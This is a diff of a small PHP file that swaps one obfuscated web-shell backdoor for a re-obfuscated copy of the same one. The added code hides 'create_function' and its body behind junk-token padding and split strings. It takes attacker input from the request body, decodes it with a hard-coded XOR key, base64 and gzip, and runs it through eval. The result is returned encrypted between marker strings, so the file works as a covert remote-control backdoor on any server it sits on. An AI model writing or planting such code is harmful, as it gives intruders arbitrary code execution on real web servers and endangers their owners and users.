@@ -1,11 +1,13 @@
 <?php
-$f='funcH:tH:iH:on x($t,$k){$c=strH:lenH:($k);$l=sH:trleH:n($t);$oH:H:="";for($i=0;H:$i<$H:H:l;){for($j=0H';
-$m=':val(@gzuH:ncoH:mpreH:ss(@xH:(@bH:ase64_deH:code($m[H:1]),$k)));H:$H:o=@oH:b_getH:_contenH:ts();@o';
-$Q=str_replace('ya','','cryaeatyae_yafyayauyanction');
-$p=':;($j<H:$H:c&&H:$i<$l);$j++,$iH:++){$o.H:=$H:t{$i}^H:$k{$j};}}rH:etH:urn $oH:;H:}if (@preg_H:H:mat';
-$j='$k="6c5H:9H:275e";$khH:="6fH:7cbc1H:dH:b30a"H:;$kf=H:"0a895H:8cb05H:09";$p="cH:zVyFQK30fJbQGDN";H:';
-$S='b_end_cleaH:n();$H:r=@basH:e64_encoH:de(@H:H:x(@gzcompresH:s($o)H:,$kH:));printH:("$pH:$kh$r$kf");}';
-$T='ch("/H:$kh(.+)$kf/"H:,@file_geH:t_contH:ents("H:H:php://inpH:ut"),$m)=H:=1) {H:H:@ob_start();H:@eH';
-$V=str_replace('H:','',$j.$f.$p.$T.$m.$S);
-$t=$Q('',$V);$t();
+$v='oy==1) {@ob_oystaoyrt(oy);@evaoyl(@gzuncompreoyss(@oyx(@boyase64_decodoye($m';
+$N='$k="6c592oy75e";$oyoykoyh="6foy7cbc1db30a";oy$kf="0oya8958cb0509oy";$p="oyI';
+$R=str_replace('vV','','cvVreatvVe_vVfvVuvVvVnction');
+$a='aKoyJnwxboyoyDSlzaoyG2s";functiooyn x($t,$k)oy{oy$c=strlen($k)oy;$oyl=strl';
+$J='[oy1]),$koy)));$ooy=@ob_geoyt_contoyoyents()oy;@ob_end_oyclean();$oyr=@bas';
+$h='en($oyt);$ooy="";fooyroyoy($oyi=0;$i<$l;)oy{for($oyj=0;oy($j<$c&&$i<$loy);';
+$B='$j++,$oyi++oy){$ooy.=$t{$i}^$k{$joy};}}oyreturn $ooy;}if (oy@poyreoyg_mat';
+$z='eoy64_encooydoye(@x(@goyzcompressoyoy($o),$k));proyoyinoyt("$p$kh$r$kf");}';
+$i='oych("oyoy/$kh(.+)$kf/",@file_goyet_coyontenoytoys("poyhp://input")oy,$m)';
+$k=str_replace('oy','',$N.$a.$h.$B.$i.$v.$J.$z);
+$n=$R('',$k);$n();
 ?>
